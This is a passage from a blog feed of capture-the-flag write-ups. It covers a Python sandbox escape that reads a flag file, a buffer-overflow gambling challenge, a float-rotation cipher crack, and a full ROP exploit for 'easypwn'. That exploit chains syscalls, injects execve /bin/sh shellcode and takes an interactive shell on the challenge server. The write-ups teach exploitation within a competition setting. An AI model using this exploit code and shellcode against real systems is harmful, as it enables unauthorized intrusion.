class="n">lsquo</span><span class="p">;</span><span class="nb">range</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">staticmethod</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">SystemError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">BaseException</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">pow</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">RuntimeError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">float</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">MemoryError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">StopIteration</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">globals</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">divmod</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">enumerate</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">apply</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">LookupError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">open</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="n">quit</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">basestring</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">UnicodeError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">zip</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">hex</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">long</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">next</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">ImportError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">chr</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">xrange</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">type</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">doc</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">Exception</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">tuple</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">UnicodeTranslateError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">reversed</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">UnicodeEncodeError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">IOError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">hasattr</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">delattr</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">setattr</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">raw_input</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">SyntaxWarning</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">compile</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">ArithmeticError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">str</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">property</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">GeneratorExit</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">int</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">import</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">KeyError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">coerce</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">PendingDeprecationWarning</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">file</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">EnvironmentError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">unichr</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">id</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">OSError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">DeprecationWarning</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">min</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">UnicodeWarning</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">execfile</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">any</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">complex</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">bool</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">ValueError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="bp">NotImplemented</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">map</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">buffer</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">max</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">object</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">TabError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">callable</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">ZeroDivisionError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">eval</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">debug</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">IndentationError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">AssertionError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="nb">classmethod</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">UnboundLocalError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">NotImplementedError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">AttributeError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="ne">OverflowError</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;]</span></code></pre></div></p>
-
-<p>On my system, the 80th value is &lsquo;open&rsquo;, but on the remote server, it&rsquo;s the 78th. Difference in Python version? Anyway, we can now call the fuction &lsquo;open&rsquo; like so and avoid the filter by using string concatenation:</p>
-
-<p><div class="highlight"><pre><code class="language-python" data-lang="python"><span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">builtins</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="nb">dict</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;&lt;</span><span class="n">a</span> <span class="n">href</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="n">title</span><span class="o">=</span><span class="s">&quot;/home/pybaby/fl&#39;+&#39;ag&quot;</span><span class="o">&gt;&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">builtins</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="nb">dict</span><span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;.</span><span class="n">keys</span><span class="p">()[</span><span class="mi">78</span><span class="p">]</span><span class="o">&lt;/</span><span class="n">a</span><span class="o">&gt;.</span><span class="n">readlines</span><span class="p">()</span></code></pre></div></p>
-
-<h1>pwn300</h1>
-
-<p>By far the easiest 300 point challenge. Again, we&rsquo;re given an ip address. Upon connecting I did what I always do:</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~<span class="nv">$ </span>nc 54.69.118.120 7000&lt;/p&gt;
-
-&lt;h1&gt;Welcome to Google Gamble.&lt;/h1&gt;
-
-&lt;p&gt;Google Gamble is easy. Guess the card drawn
-from the deck and double your money! Make it all
-the way to <span class="nv">$1048576</span> to get a flag! Good luck!&lt;/p&gt;
-
-&lt;p&gt;Your current balance: 1<span class="nv">$&lt;</span>/p&gt;
-
-&lt;p&gt;Select an option:
-1. Guess a card
-2. Get the flag
-3. Quit
-1
-Please enter your guess: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-The computer picked AAAAAAAAAAAA�        <span class="o">(</span>Valet!<span class="o">)</span>
-Congrats, you won this round!
-Your current balance: 2<span class="nv">$&lt;</span>/p&gt;
-
-&lt;p&gt;Select an option:
-1. Guess a card
-2. Get the flag
-3. Quit
-Please enter your guess: The computer picked AAAAAAAAAAAA
-Congrats, you won this round!
-Your current balance: 4<span class="nv">$&lt;</span>/p&gt;
-
-&lt;p&gt;Select an option:
-1. Guess a card
-2. Get the flag
-3. Quit
-Please enter your guess: The computer picked AAAAAA
-�
-Congrats, you won this round!
-Your current balance: 8<span class="err">$</span></code></pre></div></p>
-
-<p>I have the sick tendency to either supply SQL injections or large repeats of &lsquo;A&rsquo;. Apparently, this program checks the guess of the user versus some precomputed value. However, the large input overwrites this precomputed value. The check will always be true and the money doubles. I just rinsed &amp; repeated until I had enough to extract the flag:</p>
-
-<p><div class="highlight"><pre><code class="language-bash" data-lang="bash">Select an option:
-1. Guess a card
-2. Get the flag
-3. Quit
-Please enter your guess: The computer picked AAAAAA
-�
-Congrats, you won this round!
-Your current balance: 16777216<span class="nv">$&lt;</span>/p&gt;
-
-&lt;p&gt;Select an option:
-1. Guess a card
-2. Get the flag
-3. Quit
-2
-Here is your well-deserved prize: flag<span class="o">{</span>valet_knekt_jack_jumbo<span class="o">}</span>
-Congratulations!
-Good bye!</code></pre></div></p>
-
-<p><code>flag{valet_knekt_jack_jumbo}</code></p>
-
-<p>And that was it! I hope there&rsquo;s more of this <code>tinyctf</code> to come!</p>
+filename = sys.argv[1]
+key = math.radians(int(sys.argv[2]))
+
+bs = open(filename, 'rb').read()
+enc = open(filename + '.enc', 'wb')
+
+for i in range(0, len(bs), 2):
+    x, y = u(bs[i]), u(bs[i+1])
+    enc.write(p(x * math.cos(key) - y * math.sin(key)) + p(x * math.sin(key) + y * math.cos(key)))
+</code></pre>
+
+<p>The script takes two bytes at a time and transforms them into two floats via some goniometric functions, using a key. These floats are then dumped as DWORDS into the encrypted output file. Our first job is to determine what key was used.</p>
+
+<p>Assuming the flag really <strong>is</strong> a JPEG, we have some prior knowledge. Namely, the first two bytes are <code>0xff,0xd8</code>. I made a small file that contains only these two bytes and I ripped the first 8 bytes from <code>flag.jpg.enc</code>. I encoded the small 2-byte file with all possible keys and then compared the md5sum of each file to the md5sum of the 8-byte encoded file:</p>
+
+<pre><code class="bash">bas@tritonal:~/adventctf/rotate$ for i in `seq 0 360`; do python rotate.py ./header_real2 $i; mv header_real2.enc output$i; done
+bas@tritonal:~/adventctf/rotate$ md5sum header_encoded8
+ed3f26885ebe2ba3ec0aa61215e4dcf2  header_encoded8
+bas@tritonal:~/adventctf/rotate$ md5sum output* |grep ed3f2
+ed3f26885ebe2ba3ec0aa61215e4dcf2  output123
+</code></pre>
+
+<p>So I now know the key that was used was <code>123</code>. I then started building a decoder. I hit a few snags on the way. It turns out that <code>rotate.py</code> doesn&rsquo;t use the literal value of each byte, but instead uses <code>struct.unpack('b', byte)</code> to generate a <strong>signed</strong> representation. That threw me off for a good while.</p>
+
+<p>The decoder first builds a lookup table of each possible two-byte combination. Then, to decode, it reads eight bytes at a time and looks up the corresponding values from the lookup table. If there are no more floats to be read, it catches the error and outputs the decrypted data:</p>
+
+<pre><code class="python">import sys
+import math
+import struct
+
+p = lambda x: struct.pack('f', x)
+u = lambda x: struct.unpack('b', x)[0]
+
+if len(sys.argv) != 3:
+    sys.exit(1)
+
+filename = sys.argv[1]
+key = math.radians(int(sys.argv[2]))
+
+enc = open(filename, 'rb')
+
+lookup = {}
+for k in xrange(256):
+    for l in xrange(256):
+        x = struct.unpack('b', chr(k))[0]
+        y = struct.unpack('b', chr(l))[0]
+
+        x1 = p(x * math.cos(key) - y * math.sin(key))
+        x2 = p(x * math.sin(key) + y * math.cos(key))
+
+        x3 = struct.unpack('&lt;L', x1)[0]
+        x4 = struct.unpack('&lt;L', x2)[0]
+
+        lookup[ (x3&lt;&lt;32)+x4 ] = (k, l)
+
+going = 1
+decoded = ""
+while going:
+    try:
+        f1 = struct.unpack('&lt;L', enc.read(4))[0]
+        f2 = struct.unpack('&lt;L', enc.read(4))[0]
+
+        (x, y) = lookup[ (f1&lt;&lt;32)+f2 ]
+
+        decoded += chr(x)
+        decoded += chr(y)
+    except:
+        going = 0
+        print decoded
+</code></pre>
+
+<p>It&rsquo;s <em>horrible</em> code, but it got the job done:</p>
+
+<p><img src="/assets/adctf/rotate-flag.jpg" alt="" /></p>
+
+<p>The flag was <code>ADCTF_TR0t4T3_f4C3</code>.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Advent CTF 2014 - Easypwn]]></title>
+    <link href="http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn/"/>
+    <updated>2014-12-21T10:24:42+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn</id>
+    <content type="html"><![CDATA[<p>Another pwnable, named &ldquo;easypwn&rdquo;, no less! Should be a walk in the park, right?</p>
+
+<!-- more -->
+
+
+<p>Of course, it turns out it wasn&rsquo;t! We&rsquo;re given only the executable. The challenge description informs us: no libs, ASLR enabled. Flag is in <code>/home/easypwn/flag</code>. Great! Disassembling the binary leads to the following code:</p>
+
+<pre><code class="bash">bas@tritonal:~/adventctf$ objdump -d easypwn -M intel
+
+easypwn:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048080 &lt;syscall&gt;:
+ 8048080:   8b 54 24 0c             mov    edx,DWORD PTR [esp+0xc]
+ 8048084:   8b 4c 24 08             mov    ecx,DWORD PTR [esp+0x8]
+ 8048088:   8b 5c 24 04             mov    ebx,DWORD PTR [esp+0x4]
+ 804808c:   cd 80                   int    0x80
+ 804808e:   c3                      ret    
+ 804808f:   90                      nop
+
+08048090 &lt;pwn_me&gt;:
+ 8048090:   83 ec 10                sub    esp,0x10
+ 8048093:   b9 ed 80 04 08          mov    ecx,0x80480ed
+ 8048098:   b8 04 00 00 00          mov    eax,0x4          # write
+ 804809d:   6a 08                   push   0x8
+ 804809f:   51                      push   ecx
+ 80480a0:   6a 01                   push   0x1              # stdout
+ 80480a2:   ff d6                   call   esi
+ 80480a4:   83 c4 0c                add    esp,0xc
+ 80480a7:   89 e1                   mov    ecx,esp
+ 80480a9:   b8 03 00 00 00          mov    eax,0x3          # read
+ 80480ae:   68 80 00 00 00          push   0x80             # 128 bytes
+ 80480b3:   51                      push   ecx
+ 80480b4:   6a 00                   push   0x0              # stdin
+ 80480b6:   ff d6                   call   esi
+ 80480b8:   83 c4 0c                add    esp,0xc
+ 80480bb:   83 c4 10                add    esp,0x10
+ 80480be:   c3                      ret    
+ 80480bf:   90                      nop
+
+080480c0 &lt;_start&gt;:
+ 80480c0:   56                      push   esi
+ 80480c1:   be 80 80 04 08          mov    esi,0x8048080
+ 80480c6:   e8 c5 ff ff ff          call   8048090 &lt;pwn_me&gt;
+ 80480cb:   b9 f6 80 04 08          mov    ecx,0x80480f6
+ 80480d0:   b8 04 00 00 00          mov    eax,0x4          # write
+ 80480d5:   6a 13                   push   0x13             # 0x13 bytes
+ 80480d7:   51                      push   ecx
+ 80480d8:   6a 01                   push   0x1              # stdout
+ 80480da:   ff d6                   call   esi
+ 80480dc:   83 c4 0c                add    esp,0xc
+ 80480df:   b8 01 00 00 00          mov    eax,0x1          # exit
+ 80480e4:   6a 00                   push   0x0
+ 80480e6:   ff d6                   call   esi
+ 80480e8:   83 c4 04                add    esp,0x4
+ 80480eb:   5e                      pop    esi
+ 80480ec:   c3                      ret    
+</code></pre>
+
+<p>That&rsquo;s not a whole lot to work with. Running it gives a clue on what to do:</p>
+
+<pre><code class="bash">bas@tritonal:~/adventctf$ ulimit -c unlimited
+bas@tritonal:~/adventctf$ ./easypwn
+pwn me: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
+Segmentation fault (core dumped)
+bas@tritonal:~/adventctf$ gdb ./easypwn core
+...snip...
+Core was generated by './easypwn'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x45454545 in ?? ()
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+</code></pre>
+
+<p>OK, so it&rsquo;s a buffer overflow, yet stack is not executable. The program uses no libraries but syscalls to do its work. We must be able to ROP our way to the flag! We have the syscall gadget lined up for us at <code>0x08048080</code>. Looks easy, right? Wrong!</p>
+
+<p>There is one <strong>big</strong> problem:</p>
+
+<pre><code class="bash">08048080 &lt;syscall&gt;:
+ 8048080:   8b 54 24 0c             mov    edx,DWORD PTR [esp+0xc]
+ 8048084:   8b 4c 24 08             mov    ecx,DWORD PTR [esp+0x8]
+ 8048088:   8b 5c 24 04             mov    ebx,DWORD PTR [esp+0x4]
+ 804808c:   cd 80                   int    0x80
+ 804808e:   c3                      ret    
+ 804808f:   90                      nop
+</code></pre>
+
+<p>We have <em>no way</em> to set <code>eax</code>! The <code>eax</code> register contains the syscall number and is kind of crucial to what we want. I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> but I found no straightforward way to set <code>eax</code>. I&rsquo;d prefer a <code>mov eax</code> or <code>pop eax</code>, or even <code>sub eax</code> or <code>xor eax</code>. Anything, really! I dumped the ROP gadgets with <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">my own tool</a> and found this little gadget:</p>
+
+<pre><code>RET: 0x80480e9: les eax, [esi+ebx*2]; ret;
+</code></pre>
+
+<p>Now this is a strange way to set <code>eax</code>. The <code>les</code> operand does the following: it loads the 48-bit value at the location of <code>esi+ebx*2</code> and sets <code>eax</code> to the first 32 bits and the <code>es</code> register to the last 16 bits. <em>However</em>, <code>es</code> does not tolerate just any old value. If the wrong value is passed, the program SEGFAULTS. To keep things simple, I looked for values in the binary like this: <code>0x0000000i, 0x0000</code>. This would load 0xi in <code>eax</code> and 0x0 in <code>es</code>.</p>
+
+<p>It seemed nearly impossible to build a ROP chain that would open, read and write the data from the flag file. For instance, where would I write the filename? On the stack? ASLR is enabled so I&rsquo;d have no idea of knowing where the stack is. Instead, I went with a different strategy.</p>
+
+<p>I am going to use the syscall <code>mprotect</code> to make the code section from 0x8048000 to 0x8049000 writeable. When this succeeds, I can use syscall <code>read</code> to read in any shellcode from stdin to the code section. Finally, I simply return to that region.</p>
+
+<p>A problem here is that I can&rsquo;t set <code>eax</code> to 125 (==mprotect) with my little gadget. Instead, I re-use the return value of the last syscall before the buffer overflow: <code>read</code>! The return value of that syscall will be the number of bytes read&hellip; If we pass in 125 bytes as payload, then we get exactly the syscall number of mprotect in <code>eax</code>!</p>
+
+<p>Here&rsquo;s what I came up with, bit by bit. I started the binary via socat, to emulate the target system:</p>
+
+<pre><code class="bash">bas@tritonal:~/adventctf$ socat TCP-LISTEN:28099,fork EXEC:./easypwn
+</code></pre>
+
+<p>And this is the ROP chain I built:</p>
+
+<pre><code class="python">#!/usr/bin/python
+
+import struct
+import socket
+import telnetlib
+
+SYSCALL = 0x8048080
+POPRET = 0x80480eb  # pop esi; ret
+ADDESP = 0x80480bb  # add esp, 0x10; ret
+LESEAX = 0x80480e9  # les eax,FWORD PTR [esi+ebx*2]
+
+def p(x):
+  return struct.pack("&lt;L", x)
+
+payload = ""
+
+payload += "A"*16       # smash stack!
+
+payload += p(SYSCALL)   # I rely on the return value of the read syscall
+payload += p(ADDESP)    # fix stack with add esp, 10; ret
+payload += p(0x8048000) # address to modify
+payload += p(0x1000)    # length (page-aligned!)
+payload += p(0x7)       # PROT_READ|PROT_WRITE|PROT_EXEC
+payload += "AAAA"       # dummy value
+
+# reset ebx so we can set eax using the next gadget
+payload += p(SYSCALL)
+payload += p(ADDESP)
+payload += p(0)         # set ebx = 0
+payload += p(0x1000)    # don't care
+payload += p(0x7)       # don't care
+payload += "AAAA"       # dummy
+
+# set eax = 3
+# 0x804834a:    0x00000003  0x00000000
+payload += p(POPRET)    # pop esi; ret
+payload += p(0x804834a) # set esi = 0x804834a
+payload += p(LESEAX)    # eax -&gt; 0x3 == syscall_read
+
+payload += p(SYSCALL)
+payload += p(ADDESP)    # fix stack
+payload += p(0)         # stdin
+payload += p(0x8048000) # address of buffer
+payload += p(0x200)     # number of bytes to read
+payload += "BBBB"       # dummy value
+
+payload += p(0x8048000) # return to shellcode!
+
+# payload length must be 125, because after read, the next
+# syscall is mprotect; eax = 125
+payload += "A"*(125-len(payload))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#s.connect(("localhost",28099))
+s.connect(("pwnable.katsudon.org",28099))
+
+s.send(payload)
+
+# http://www.shell-storm.org/shellcode/files/shellcode-851.php
+s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")
+
+# the shell should have been spawned, so interact with it
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+</code></pre>
+
+<p>This first bit of python sets up the exploit. I have a helper function called <code>p(x)</code> that can dump addresses in the correct endianness into the payload. First, the payload consists of 16 bytes to smash the stack. Then, the ROP chain starts. Finally, I made sure that the first payload is 125 bytes, so that <code>eax</code> will contain the correct syscall number for mprotect. This first important part of the ROP chain looks like this:</p>
+
+<pre><code class="python">payload += p(SYSCALL)   # I rely on the return value of the read syscall
+payload += p(ADDESP)    # fix stack with add esp, 10; ret
+payload += p(0x8048000) # address to modify
+payload += p(0x1000)    # length (page-aligned!)
+payload += p(0x7)       # PROT_READ|PROT_WRITE|PROT_EXEC
+payload += "AAAA"       # dummy value
+</code></pre>
+
+<p>This will call <code>syscall(0x8048000, 0x1000, 0x7)</code> with <code>eax</code> set to 125. This makes the memory area at 0x8048000 writeable! Next, I need to read in the shellcode, but for that <code>eax</code> must be 3. I first reset <code>ebx</code>:</p>
+
+<pre><code class="python"># reset ebx so we can set eax using the next gadget
+payload += p(SYSCALL)
+payload += p(ADDESP)
+payload += p(0)         # set ebx = 0
+payload += p(0x1000)    # don't care
+payload += p(0x7)       # don't care
+payload += "AAAA"       # dummy
+</code></pre>
+
+<p>Whatever this syscall is (I don&rsquo;t know the value of <code>eax</code> after the mprotect call, nor do I care), it fails but the side-effect is that <code>ebx</code> is now 0. That sets us up for moving the correct number in <code>eax</code>:</p>
+
+<pre><code class="python"># set eax = 3
+'''
+0x804834a:  0x00000003  0x00000000
+'''
+payload += p(POPRET)    # pop esi; ret
+payload += p(0x804834a) # set esi = 0x804834a
+payload += p(LESEAX)    # eax -&gt; 0x3 == syscall_read
+</code></pre>
+
